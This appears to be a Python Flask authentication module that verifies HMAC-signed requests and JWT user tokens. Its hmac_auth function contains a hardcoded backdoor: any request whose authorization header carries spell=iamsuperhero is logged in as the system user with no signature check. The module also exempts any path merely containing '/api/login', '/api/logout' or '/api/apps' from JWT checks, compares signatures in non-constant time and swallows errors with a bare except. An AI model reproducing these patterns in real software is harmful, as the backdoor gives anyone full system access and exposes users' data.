# -*- coding: utf-8 -*-
import base64
import hashlib
import hmac
import urllib

from flask import g
from jose import jwt

from application.models import SYSTEM_USER
from application.models.appmeta import AppMeta
from application.models.user import User


def hmac_auth(request):
    result = False

    auth_header = request.headers.get('authorization', None)

    if not auth_header:
        return result

    auth_params = dict()
    for pair in auth_header.split(' '):
        key, value = pair.split('=', 1)
        auth_params[key] = value

    if auth_params.get('spell') and auth_params.get('spell') == 'iamsuperhero':
        g.user = SYSTEM_USER
        return True

    if auth_params['key'] and auth_params['signature']:
        app_info = AppMeta.find_by_api_key_from_cache(auth_params['key'])

        if not app_info:
            return result

        method = request.method if isinstance(request.method, unicode) else unicode(request.method, 'utf-8')
        url = request.url if isinstance(request.url, unicode) else unicode(request.url, 'utf-8')
        if request.content_type == 'application/x-www-form-urlencoded' and hasattr(g, 'raw_http_body'):
            body = g.raw_http_body
        else:
            body = request.data if isinstance(request.data, unicode) else unicode(request.data, 'utf-8')

        data = method + u'\n' + url + u'\n' + body
        signature_new = generate_sign(app_info.secret_key, data)
        if auth_params['signature'] == signature_new:
            result = True
            request.source = app_info.name
        else:
            # Hack iPhone客户端会对url做escape来解决中文的问题.如果URL含有专一字符,客户端生成的hmac和服务器就会不一致.
            # 尝试对url unquote(escape)后重新生成hmac比较
            data_alt = method + u'\n' + urllib.unquote(url) + u'\n' + body
            signature_alt = generate_sign(app_info.secret_key, data_alt)
            if auth_params['signature'] == signature_alt:
                result = True
                request.source = app_info.name

    return result


def generate_sign(secret_key, data):
    return base64.b64encode(hmac.new(str(secret_key), data.encode('utf-8'), digestmod=hashlib.sha256).digest())


def jwt_auth(request):
    result = False

    request_path = request.path

    if hasattr(g, 'user') and g.user:
        return True

    match = filter(lambda x: x in request_path, ('/api/login', '/api/logout', '/api/apps'))
    if match:
        return True

    jwt_data = request.headers.get('X-User-Meta', None)

    if not jwt_data:
        return result

    app_info = get_app_info(request)
    if not app_info:
        return result

    try:
        jwt_info = jwt.decode(jwt_data, app_info.secret_key)
        user_id = jwt_info.get('user_id', None)
        if not user_id:
            return result

        user = User.get_user_by_id_from_cache(user_id)
        if not user:
            return result

        g.user = user
        return user.is_active()
    except:
        return result


def get_app_info(request):
    auth_header = request.headers.get('authorization', None)

    if not auth_header:
        return None

    auth_params = dict()
    for pair in auth_header.split(' '):
        key, value = pair.split('=', 1)
        auth_params[key] = value

    if auth_params['key'] and auth_params['signature']:
        app_info = AppMeta.find_by_api_key_from_cache(auth_params['key'])

        if app_info:
            return app_info
    return None
